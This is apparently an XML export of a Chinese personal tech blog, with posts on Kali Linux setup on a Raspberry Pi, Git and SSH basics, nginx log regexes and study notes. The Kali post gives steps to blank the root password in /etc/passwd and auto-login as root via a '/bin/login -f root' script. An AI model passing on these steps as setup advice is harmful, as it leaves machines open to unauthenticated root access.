XTIFlXPuyahc4n5JvkxzekJ12peR3z1sau/k7N06nx7JZOd8jJghiUDfPpBg+QXr4AFj/5K5+D5orzxlQSGVQT6/8piVN1GpO58Vq0oEotxzcWHZm9g/S0vD3gsSlaRASJtSI5PkI5d81jj1nwMFc6FLwZUm9dmzUuuqsjj2tiaBO0IhRT4SB3vkAxWReGerMMwfN7CYXU9CCcMh6ePsUU6mH/j9PE0B6mcX0ipIhC3xAlCIzaYf9LFLqohlw+lQ4zGk98cyx51ElqJmBrwHKb9xxuCpZBF4IwXmoxlqkF38T7dzEiUtgzDNYkrPB/xkwEhRXpCoTnNWOhwAiDrV5TGMVmXWum7n90zBOsCYFSz/rUcUt377AG9bZF4FfKsAwS8kefplzsJV2cO6SilsMNSq9z1LqiIXJrYVNpXBZUAzrmDYh7Vn+Jm0XYxFt/b5inf5v3z6B8fTeQFWCIBaCvY2erQOnDUzmNytYj+yb+c4tRDVIzfLtxHxFFltr4MNhTY+PmYJ7sQvylndwq6i5ZTCbdqJgAZ6hVO3mlgEdf9XzkZ6xNeWmjEBHunB9x6wN1R1WqootRFUb/C7uG+11Xk+oN957YUQNm6CJ2T11yM8Haei4bg612/k+vv/mS/nGqdUqxXlWbqPniQ/hy93ak+2uaKhr5tNxGdxkr2UKE4BVPFw8cdN4XD7Y1gkUtk9LxCQOBL/Thzpxoc54Lx2T2B9gt8mHH23sexzD8HsMqdIgTA/NymCDuw5KgTrlIhrIJ58ZmeVyQWRThBIAXq5nJPjaMtlQEgQK5QwigOfh9b5Gnwz0MioHL1Q9nFOhnn5gZsztpw9ldiYpRjTFaa4kB7hqaF/HA2eok/+FdzKaAvGJLsT0rxmY6020wuLIZQhSl6f2Mu2YXQuQgI6seUj7N8zrnuGqQSTh2oK0tt1ZP42Cpjk3OKTQq10DYc/cJXPyHPAAcB6cT2310OxEv3rG+qySpJnXahvAtNfX5FY/Foj8TVvX7XMc7iJrqvSbhppYze6Bg7ip/HVaL1gY8Ed7Ye4mSmPQiKCemhkrwCd/+Db38TcRxV+4UPJMSnW3qNkzc4hnzzIxM1hJWbFgYIjpLfGblRE183fCiTF40vSc9mKgceCjC73AOIUurGS52d+LhjD91KS/CKn9RUW9h27PKc+w+lePuU9bfMiuoBnYk2rItb8kmk7Oj8+Zw/zALbWRI4pWL6Buy9UYjWEObveVfkH0jnLLyy0P04XbMW/x0eEZX0CKPYdEJMMAU4KN0E0YOR/zC7qVwENOGqswjIzYLIp1Mtb1cCA5z7C4WAZWmWW9aEhMH2Dt6g/PW6WjfpFZtXHqoUpVZn5ReNvEFju+8fmRbvycTBLVv3qVkQb06BMM/qYaxw2zXxMNB7yuULWROGkClBu6OeOoBVJsiR8gxNKVAvvvc4IDqxMN/hJv5g+eiVGo4ZcTNqv46xcc6QgIShCN6wn+DwyuUnVbR4p1g2iXEErwI0gd8vweiZTlrsUOowXhydYghFxJ6bxI3xrIYTrqsoJA93Fj8VaNEwVPPfzuF2BtaQaXJ9Harky79XxtHwdo18Z4foABWUK9jtPg83O6TTlCo2yuwQjml/mELs3whjClPflPt52I0/xwm1EJIxOW7BKPqF3XXqs2Qv10JwLJhfpwtwJYE8NeFQDkkXcLQ1m9mEPqiTsjY2qgOjJ89czPmC/MQOmIZMO/rQEA0Go4QQT5HpZYdYszJK18tTLGGVwh7Qthh8RyVKsDFPDSIL2laza+XMGkFcgXiTHBirAEyKTGKAWJLWU8QlqpYZYrcbwpC6me7bardIMCWoI+3BV0qXnYGJEzI0UjfFX/LlBM4gPT0rRS9eufiKFxZ48w7bd12me6Ga8Lz8U//tK/hsBH859mXbVIWUz2RzfS1r+quFr2cLR2G+5Q9kfPG1+/BRK+6WnhZ3CycE0rNJCp6Na2tHbA00uzvL5uGvWX9ot41bQi9g/44p0bvK/Fj4XTTmS44A3ffOp8ZSmE7YWzLb2vqs/Ogq+j0BM3NPBVeWhRhplxFWvY/wNpf3A4XPV4NZSh+yrZ97SHOpT0N++rDrmbIa/Ah256AFy40E1lxv1Hkyp4yCmQ/5pZ3RtwFWLQeF3Whni5wXDyBhKKsa5wAOBE3HhywsBqVFEJ+JHLH2Wx/MgV7/dKAwI+soP1KxLZpZj4294G1NW/Y6WyZCzgWu2wKLUhy4TiFvG08TbJ5HkbiU9btYkcyNFTWKKiPHtMikvbe8TZ40tXWrpirr7iebTu7UqlpiU2TnX2Ir2+C4tJ+jJPLpk4S1ILDDcKAO7zeX/pgA3lW9vEqrE3CrjmY3yR+0rUIqpdtUuUaAdAEerThMAXRJPqdQMYZpZRCbYfnnkg4SofoCZ9OKyPlmLZmUeYFbhC110gVQ+8f4We8BHUvVzcnMTlEcFNtIV2oELunJ/LVRBC+WhvEwbCQJO0r+RCyrUHywyj0w+yPeOv8+HhxcgmqacGl6MrcDe12thyhYSmTnelPf6UHheAwvejDxF3it8z9PUVOLE2B0ob+iN+F7or8DGKmZiUis2OE0SxfFMV3Q+czsa+nxYMkHAKxHU8ly8FK0EQeY0HEg0lGmv9OPh/k1CWfMkQWDUAirX2ibzViMVFi6qxIX3a9B5Fy67iuyS2pfJRE97ufannweMwmUeBMHiGyuJ+oz2F1EUtfFsYMBNrSG2NoBWL+/LJBkdglg5CxUuRWB8l0NlhaqPC2dHGSOb6pGTlTFUf2DxsM40DnJ+Qa1fo/peml22nBtKORDFvTF2+SZXwtOQ44hwRfBegis/MoctbZnYmugua/3m0aK0TOG1z85pCXrsB2+puPQAJgNQLXDOrz/ML435zJtDiHmMPmRLIITSiJA3AW9Kx7ARZ/RulzIXSvKqRo2A8iS25P7vJKNa3pP5WAxmiuxcO9b2X0/U1j3aj8NxyyvNCJyf8RzFRPws= </div>]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>抓包-Fiddler</title>
    <url>/%E6%8A%93%E5%8C%85-Fiddler/</url>
    <content><![CDATA[<p><a href="http://url.cn/5qIhVq2" target="_blank" rel="noopener">万能抓包工具 Fiddler</a><br><a id="more"></a></p>
]]></content>
      <categories>
        <category>链接收集</category>
      </categories>
      <tags>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器环境搭建</title>
    <url>/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>服务器环境</tag>
      </tags>
  </entry>
  <entry>
    <title>新年新计划新起航</title>
    <url>/%E6%96%B0%E5%B9%B4%E6%96%B0%E8%AE%A1%E5%88%92%E6%96%B0%E8%B5%B7%E8%88%AA/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>计划</tag>
        <tag>新起航</tag>
      </tags>
  </entry>
  <entry>
    <title>正则大法好</title>
    <url>/%E6%AD%A3%E5%88%99%E5%A4%A7%E6%B3%95%E5%A5%BD/</url>
    <content><![CDATA[<h2 id="知识点整理"><a href="#知识点整理" class="headerlink" title="知识点整理"></a>知识点整理</h2><h2 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h2><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="正则表达式保留匹配内容，在前添加任意字符"><a href="#正则表达式保留匹配内容，在前添加任意字符" class="headerlink" title="正则表达式保留匹配内容，在前添加任意字符"></a>正则表达式保留匹配内容，在前添加任意字符</h3><p>markdown 编写晚之后觉得加个目录比较好，方便查阅，但是内容太多，不好加 ### ，所以利用 vscode 的正则匹配添加功能</p>
<p><code>(?=\d{2}、)</code></p>
<p>参考资料：<br><a id="more"></a><br><img data-src="http://imgsrc.baidu.com/forum/pic/item/66659a2f07082838e4102709b499a9014c08f1ad.jpg" alt></p>
<h3 id="正则小语法"><a href="#正则小语法" class="headerlink" title="正则小语法"></a>正则小语法</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201126/woY7Q371UWbC.png" alt="mark"></p>
<h3 id="正则参考语法样例："><a href="#正则参考语法样例：" class="headerlink" title="正则参考语法样例："></a>正则参考语法样例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">([^\s]*)              # 匹配 $http_host</span><br><span class="line">(\d+\.\d+\.\d+\.\d+)  # 匹配 $server_addr,$remote_addr</span><br><span class="line">(\&quot;\d+\.\d+\.\d+\.\d+\,\s\d+\.\d+\.\d+\.\d+\&quot;|\&quot;\d+\.\d+\.\d+\.\d+\&quot;) #匹配 &quot;$http_x_forwarded_for&quot;</span><br><span class="line">(\[[^\[\]]+\])     #匹配[$time_local]</span><br><span class="line">(\&quot;(?:[^&quot;]|\&quot;)+|-\&quot;)  # 匹配&quot;$request&quot;,&quot;$http_referer&quot;，&quot;$http_user_agent&quot;</span><br><span class="line">(\d&#123;3&#125;)               # 匹配$status</span><br><span class="line">(\d+|-)               # 匹配$body_bytes_sent</span><br><span class="line">(\d*\.\d*|\-)         # 匹配$request_time,$upstream_response_time&apos;</span><br><span class="line">^                     # 匹配每行数据的开头</span><br><span class="line">$                     # 匹配每行数据的结局</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>正则</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装kali-linux</title>
    <url>/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali-linux/</url>
    <content><![CDATA[<h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p>1.树莓派<br>2.一张16G以上的SD卡</p>
<p>3.树莓派的镜像（<a href="https://www.offensive-security.com/kali-linux-arm-images/）" target="_blank" rel="noopener">https://www.offensive-security.com/kali-linux-arm-images/）</a></p>
<p>4.解压.xz格式的镜像，解压成.img，并用烧录软件Win32 Disk Imager烧录到SD卡</p>
<p>5.插卡，接线，开机，输入账号密码root toor，进入kali桌面<br><a id="more"></a><br>连接网络：<br>1.通过双绞线链接电脑，电脑连接wifi，电脑wifi网络要共享。<br>2.通过双绞线和PC机器连接同一个路由器<br>3.装备齐全的的条件下，通过键盘鼠标操作，连接wifi与PC机器在同一个局域网下。</p>
<h2 id="安装汉语相关配置"><a href="#安装汉语相关配置" class="headerlink" title="安装汉语相关配置"></a>安装汉语相关配置</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>树莓派安装了 Kali 系统之后，所有的中文都显示为了乱码，就连打开浏览器之后上面的问题也都是乱码了。懒人不上图了。</p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.首先设置 Kali 的更新源：</p>
<pre><code>vi /etc/apt/sources.list</code></pre>

<p>针对这种操作，我喜欢在Xshell+Winscp 修改文件内容，很少在vi下，在命令行下推荐vim</p>
<pre><code>#中科大
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>

<p>2.刷新软件列表：</p>
<pre><code>sudo apt-get update</code></pre>
3.安装中文字体 ：
<pre><code>sudo apt-get install ttf-wqy-zenhei</code></pre>
4.下载完成之后输入
<pre><code>sudo dpkg-reconfigure locales</code></pre>

<p>5.在这个界面把下面的三个选择上（按空格键选择）其余取消选择</p>
<p>en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8</p>
<p>注意：<br>table 键选择 ok<br>6.然后选择<br>zh_CN.UTF-8</p>
<p>7重启<br>reboot<br>重启之后就是中文界面了</p>
<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>1.安装中文输入法</p>
<pre><code>apt-get install fcitx</code></pre>

<p>4.安装谷歌输入法</p>
<pre><code>apt-get install fcitx-googlepinyin</code></pre>

<p>5.安装完成后没有什么变化，重启一下</p>
<pre><code>reboot</code></pre>

<p>6.开机后就可以按住 ctrl 来回切换了（kali 2.0是按 ctrl+空格）</p>
<p>注：其他输入法</p>
<pre><code>apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei  #拼音五笔
apt-get install ibus ibus-pinyin 　　　　　　　　　　　　　　　　　  #经典的ibus
apt-get install fcitx fcitx-googlepinyin 　　　　　　　　　　　　　   #fcitx拼音</code></pre>

<h2 id="更新安装完整输入法"><a href="#更新安装完整输入法" class="headerlink" title="更新安装完整输入法"></a>更新安装完整输入法</h2><pre><code>apt install kali-linux-all</code></pre>

<h2 id="linux开机跳过输入用户名密码"><a href="#linux开机跳过输入用户名密码" class="headerlink" title="linux开机跳过输入用户名密码"></a>linux开机跳过输入用户名密码</h2><p>deepin国产系统设置中自带改功能，用起来很舒服，win也有这个功能，不想输入密码还不是因为懒，反正又没有小秘密，不怕看。<br>步骤：<br>1、省略密码验证</p>
<p> 很简单，只需把/etc/passwd中的root:x:0:0:root:/root:/bin/bash，改为root::0:0:root:/root:/bin/bash，就可以了，就是去掉了里面的x，这样root用户就不用密码了。其他用户也一样。</p>
<p>体验感触：不舒服，还需要鼠标点一下登录，不然回车没反应。ssh连接凉了，<br>无奈，不推荐偷懒，如果笔记本安装一个推荐或者树莓派安装了一个触摸屏也推荐。</p>
<p>(1)修改/etc/inittab</p>
<p>在inittab中，有如下配置</p>
<pre><code>1:2345:respawn:/sbin/agetty tty 9600</code></pre>

<p>我们只需将其修改为不执行agettty，而是执行自己编写的一个脚本，就可以跳过用户名和密码的输入。修改如下：</p>
<pre><code>1:2345:respawn:/root/logintest tty 9600</code></pre>

<p>这里我在/root/下放了一个测试脚本，这样系统启动时就会执行那个脚本，脚本内容：</p>
<pre><code>#!/bin/sh

/bin/login -f root</code></pre>


<p>脚本其实就是执行了一个root用户的登陆而已，如果有其他要求，也可以添加到脚本中。</p>
<p>体验：<br>同上</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>kali-linux</tag>
      </tags>
  </entry>
  <entry>
    <title>版本控制-git入门</title>
    <url>/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6-git%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>安装什么的简单的就不说了，基本操作了~</p>
<h2 id="基本的-Git-工作流程如下："><a href="#基本的-Git-工作流程如下：" class="headerlink" title="基本的 Git 工作流程如下："></a>基本的 Git 工作流程如下：</h2><ol>
<li>在工作目录中修改某些文件。</li>
<li>对修改后的文件进行快照，然后保存到暂存区域。</li>
<li>提交更新，将保存在暂存区域的文件快照永久转储到 Git 目录中。<a id="more"></a>
<h2 id="Git基本命令："><a href="#Git基本命令：" class="headerlink" title="Git基本命令："></a>Git基本命令：</h2><img data-src="https://upload-images.jianshu.io/upload_images/6407592-e84d0d76a7979a61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Git mingling"></li>
</ol>
<h2 id="Git具体命令（初识下）"><a href="#Git具体命令（初识下）" class="headerlink" title="Git具体命令（初识下）"></a>Git具体命令（初识下）</h2><h3 id="mkdir-python"><a href="#mkdir-python" class="headerlink" title="mkdir python"></a>mkdir python</h3><p>（创建文件夹test）</p>
<h3 id="cd-python"><a href="#cd-python" class="headerlink" title="cd python"></a>cd python</h3><p>（切换到test目录）</p>
<h3 id="touch-ex1-py"><a href="#touch-ex1-py" class="headerlink" title="touch ex1.py"></a>touch ex1.py</h3><p>（新建a.md文件）</p>
<h3 id="Git-init"><a href="#Git-init" class="headerlink" title="Git init"></a>Git init</h3><p> (初始化Git仓库)</p>
<h3 id="Git-status"><a href="#Git-status" class="headerlink" title="Git status"></a>Git status</h3><p>（查看状态，这个命令可以算是使用最频繁的一个命令了，没事就输入下这个命令，来查看你当前 git 仓库的一些状态）<br>图片如下：<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-e6a592e8b3612300.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ststus"></p>
<blockquote>
<p>默认就直接在 master 分支，关于分支的概念后面会提，这时最主要的是提示 ex1.py 文件</p>
<blockquote>
<p>Untracked files ，就是说 ex1.py 这个文件还没有被跟踪，还没有提交在 git 仓库里呢，而且提<br>示你可以使用 git add 去操作你想要提交的文件。</p>
</blockquote>
</blockquote>
<h3 id="Git-add"><a href="#Git-add" class="headerlink" title="Git add"></a>Git add</h3><p>（提交到Git仓库里面）<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-f0914c41f810156b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="add"><br>此时提示以下文件 Changes to be committed ， 意思就是 ex1.py 文件等待被提交，当然可以使用 git rm –cached 这个命令去移除这个缓存。</p>
<h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p>（接着输入 git commit -m ‘first commit’ ，commit 是提交的意思，- m 代表是提交信息，执行了以上命令代表我们已经正式进行了第一次提交。这个时候再输入 git status ，会提示 nothing to commit。）<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-a6765c314155026e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="commit"></p>
<h3 id="Git-log"><a href="#Git-log" class="headerlink" title="Git log"></a>Git log</h3><p>（git log 命令可以查看所有产生的 commit 记录，所以可以看到已经产生了一条 commit 记录，而提交时候的附带信息叫 ‘first commit’ 。）<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-43ef9f8c336cba8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="log"></p>
<h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>（branch 即分支的意思）</p>
<blockquote>
<p>分支的概念很重要，尤其是团队协作的时候，假设两个人都在做同一个项目，这个时候分支就是保证两人能协同合作的最大利器了。</p>
<blockquote>
<p>举个例子，A, B俩人都在做同一个项目，但是不同的模块，这个时候A新建了一个分支叫a， B新建了一个分支叫b，这样A、B做的所有代码改动都各自在各自的分支，互不影响，等到俩人都把各自的模块都做完了，最后再统一把分支合并起来。</p>
</blockquote>
</blockquote>
<blockquote>
<p>执行 git init 初始化git仓库之后会默认生成一个主分支 master ，也是你所在的默认分支，也基本是实际开发正式环境下的分支，一般情况下 master 分支不会轻易直接在上面操作的</p>
<blockquote>
<p>如果我们想在此基础上新建一个分支呢，很简单，执行 git branch a 就新建了一个名字叫 a 的分支，这时候分支 a 跟分支 master 是一模一样的容，我们再输入 git branch 查看的当前分支情况：<img data-src="https://upload-images.jianshu.io/upload_images/6407592-0b43dbf4334463b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="branch"></p>
<blockquote>
<p>但是可以看到 master 分支前有个 * 号，即虽然新建了一个 a 的分支，但是当前所在的分支还是在 master 上，如果我们想在 a 分支上进行开发，首先要先切换到 a 分支上才行，所以下一步要切换分支<pre><code>git checkout python1 </code></pre><img data-src="https://upload-images.jianshu.io/upload_images/6407592-e81e65bb95d7e41c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkout"></p>
<blockquote>
<p>快捷操作方式<pre><code>git checkout -b python2</code></pre>（这个命令的意思就是新建一个python2分支，并且自动切换到python2分支。）<img data-src="https://upload-images.jianshu.io/upload_images/6407592-f05a8936d2eff2c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkout2"></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h3><p>（合并分支）<br>需要先做两步，第一步是切换到 master 分支，如果你已经在了就不用切换了，第二步执行 git merge python1 ，意思就是把 python1 分支的代码合并过来，不出意外，这个时候a分支的代码就顺利合并到 master 分支来了。意外的情况就是发生了冲突，不方便合并！</p>
<h3 id="git-branch-d"><a href="#git-branch-d" class="headerlink" title="git branch -d"></a>git branch -d</h3><p>（删除分支）</p>
<h3 id="git-branch-D"><a href="#git-branch-D" class="headerlink" title="git branch -D"></a>git branch -D</h3><p>（强制删除分支，原因是该分支没有和master分支进行合并）</p>
<h3 id="Git-tag"><a href="#Git-tag" class="headerlink" title="Git tag"></a>Git tag</h3><p>（添加标签/版本号的意思）</p>
<p>新建一个标签很简单，比如 git tag v1.0 就代表我在当前代码状态下新建了一个v1.0的标签，输入 git tag 可以查看历史 tag 记录。</p>
<p>想要切换到某个 tag 怎么办？也很简单，执行 git checkout v1.0 ，这样就顺利的切换到 v1.0 tag的代码状态了。</p>
<h2 id="SSH爬坑"><a href="#SSH爬坑" class="headerlink" title="SSH爬坑"></a>SSH爬坑</h2><h3 id="1-SSH简介"><a href="#1-SSH简介" class="headerlink" title="1. SSH简介"></a>1. SSH简介</h3><p>简单点说，SSH是一种网络协议，用于计算机之间的加密登录。目前是每一台 Linux 电脑的标准配置。而大多数 Git 服务器都会选择使用 SSH 公钥来进行授权，所以想要在 GitHub 提交代码的第一步就是要先添加 SSH key 配置。</p>
<h3 id="生成SSH-key"><a href="#生成SSH-key" class="headerlink" title="生成SSH key"></a>生成SSH key</h3><p>Linux 与 Mac 都是默认安装了 SSH ，而 Windows 系统安装了 Git Bash 应该也是带了 SSH的。大家可以在终端（win下在 Git Bash 里）输入 ssh 如果出现以下提示证明你本机已经安装 SSH。</p>
<p><pre><code> ssh-keygen -t rsa </code></pre><br>就是指定 rsa 算法生成密钥，接着连续三个回车键（不需要输入密码），然后就会生成两个文件 id_rsa 和 id_rsa.pub ，而 id_rsa 是密钥,id_rsa.pub 就是公钥。</p>
<p>PS：输入密码的话要做好备份，防止密码遗忘~<br>如果密码忘记就要删除重建了！</p>
<h3 id="3-GitHub-上添加-SSH-key"><a href="#3-GitHub-上添加-SSH-key" class="headerlink" title="3. GitHub 上添加 SSH key"></a>3. GitHub 上添加 SSH key</h3><p>在 GitHub 上的设置页面，点击最左侧 SSH and GPG keys ,然后点击右上角的 New SSH key 按钮,在 Key 那栏把 id_rsa.pub(使用 EditPlus 或者 Sublime 等打开复制就行了) 公钥文件里的内容复制粘贴进去就可以了，Title 那栏不需要填写，点击 Add SSH key 按钮就ok了。</p>
<p>SSH key 添加成功之后，输入 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> 进行测试，如果出现以下提示证明添加成功了。</p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-4abdc9d433b4dd1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功"></p>
<h4 id="错误一："><a href="#错误一：" class="headerlink" title="错误一："></a>错误一：</h4><p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-ec459b9039c5b46b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="错误"></p>
<p>改了密钥的存放位置，此时，你需要分别执行下面两条命令：</p>
<p><pre><code><br>ssh-agent bash<br>ssh-add 这里填写你密钥的存放位置</code></pre><br>如果你给公钥设置了密码，那么执行 ssh-add xxx 之后会提示你输入密码。</p>
<h4 id="错误二："><a href="#错误二：" class="headerlink" title="错误二："></a>错误二：</h4><p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-b64518d140e86afa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="错误2"><br>宿主的 GITHUB.com（52.74.223.119）的真实性是无法成立的。RSA密钥指纹是Sa256:NTBG6KXUPJWGL7E1IGOCSFPROXTXDCARLVIKW6E5SY8。</p>
<p>重新生成了密匙，选择yes，然后显示<br><img data-src="https://upload-images.jianshu.io/upload_images/6407592-686b81ca1868dbee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="解决"></p>
<h2 id="请把-gitattributes-加到你的-Git-仓库中"><a href="#请把-gitattributes-加到你的-Git-仓库中" class="headerlink" title="请把 .gitattributes 加到你的 Git 仓库中"></a>请把 .gitattributes 加到你的 Git 仓库中</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200302/mMtdC1uHNYl8.png?imageslim" alt="mark"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>版本控制-svn入门</title>
    <url>/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6-svn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>程序员练级攻略之笔记</title>
    <url>/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%BB%83%E7%BA%A7%E6%94%BB%E7%95%A5%E4%B9%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h6 id="专业基础篇内容简介："><a href="#专业基础篇内容简介：" class="headerlink" title="专业基础篇内容简介："></a>专业基础篇内容简介：</h6><p>在编程语言方面，推荐学习C、C++和Java这三个工业级的程语言。<br>理论学科方面，需要学习算法、数据结构、网络模型、计算机原理等内容。<br>系统知识方面会讲述 Unix/Linux 、 TCP/IP 、 C10K 挑战等专业的系统知识。</p>
<h6 id="最后给出了你可以选择的几大从业方向。"><a href="#最后给出了你可以选择的几大从业方向。" class="headerlink" title="最后给出了你可以选择的几大从业方向。"></a>最后给出了你可以选择的几大从业方向。</h6><ul>
<li>如果你对操作系统、文件系统、数据库、网络等比较感兴趣，那么可以考虑从事底层方面的工作。</li>
<li>如果对分布式系统架构、微服务、DevOps、Cloud Native等有热情，那么可以从事架构方面的工作。</li>
<li>如果是对大数据、机器学习、人工智能等比较关注，那么数据领域可以成为你一展身手的地方。</li>
<li>如果你对用户体验或者交互等更感兴趣，那么前端工程师也是个不错的选择。</li>
<li>此外，安全开发、运维开发、嵌入式开发等几大方向中，也为你提供了丰富多彩的发展空间。<a id="more"></a>
</li>
</ul>
<p>与孩子一起学编程 这本书以Python语言教你如何写程序，是一本老少咸宜的编程书。其中会教你编一些小游戏，还会和你讲基本的编程知识，相当不错。</p>
<h6 id="两个在线编程入门的网站："><a href="#两个在线编程入门的网站：" class="headerlink" title="两个在线编程入门的网站："></a>两个在线编程入门的网站：</h6><p> <a href="https://www.codecademy.com/catalog/subject/all" target="_blank" rel="noopener">Codecademy: Learn Python</a> 和  <a href="https://blackbird.school/" target="_blank" rel="noopener">People Can Program</a> ，你也可以在这两个网站上学习Python，只不过是英文的。</p>
<h6 id="在线编程的小练习"><a href="#在线编程的小练习" class="headerlink" title="在线编程的小练习"></a>在线编程的小练习</h6><p>可以到 <a href="http://www.codeabbey.com/index/task_list" target="_blank" rel="noopener">CodeAbbey</a> 上去做一些在线编程的小练习。</p>
<p>######　第二份入门教程，做个网页吧。<br><a href="https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web" target="_blank" rel="noopener">MDN的 Web开发入门</a> MDN全称是Mozilla Developer Network，你可以认为是Web方面的官方技术网站。这个教程会带着你建立一个网站。然后，你可以把你的网页发布在GitHub上。<br>这两份教程都很不错，都是从零开始，带着你从环境准备开发，一点一点地从一些简单而有意的东西入手，让你感觉一下编程世界是什么样的，相信这两个教程可以让零基础的你喜欢上编程。</p>
<h6 id="提高英文能力的建议"><a href="#提高英文能力的建议" class="headerlink" title="提高英文能力的建议"></a>提高英文能力的建议</h6><ul>
<li><p>1、坚持Google英文关键词，而不是在Google里搜中文。</p>
</li>
<li><p>2、在GitHub上只用英文。用英文写代码注释，写Code Commit信息，用英文写Issue和Pull Request，以及用英文写Wiki。</p>
</li>
<li><p>3、坚持到YouTube上每天看5分钟的视频。YouTube上有相关的机器字幕，实在不行就打开字幕。</p>
</li>
<li><p>4、坚持用英文词典而不是中文的。比如：<a href="https://dictionary.cambridge.org/" target="_blank" rel="noopener">剑桥英语词典</a> 或是 <a href="http://www.dictionary.com/" target="_blank" rel="noopener">Dictionary.com</a> 。你可以安装一个Chrome插件 <a href="https://chrome.google.com/webstore/detail/google-dictionary-by-goog/mgijmajocgfcbeboacabfgobmjgjcoja" target="_blank" rel="noopener">Google Dictionary</a> 。</p>
</li>
<li><p>5、坚持用英文的教材而不是中文的。比如：<a href="http://www.bbc.co.uk/learningenglish/" target="_blank" rel="noopener">BBC 的 Learning English</a> ，或是到一些ESL网站上看看，如 <a href="https://www.rong-chang.com/" target="_blank" rel="noopener">ESL: English as a Second Language</a> 上有一些课程。</p>
</li>
<li><p>6、花钱参加一些线上的英文课程，用视频和老外练习。</p>
</li>
</ul>
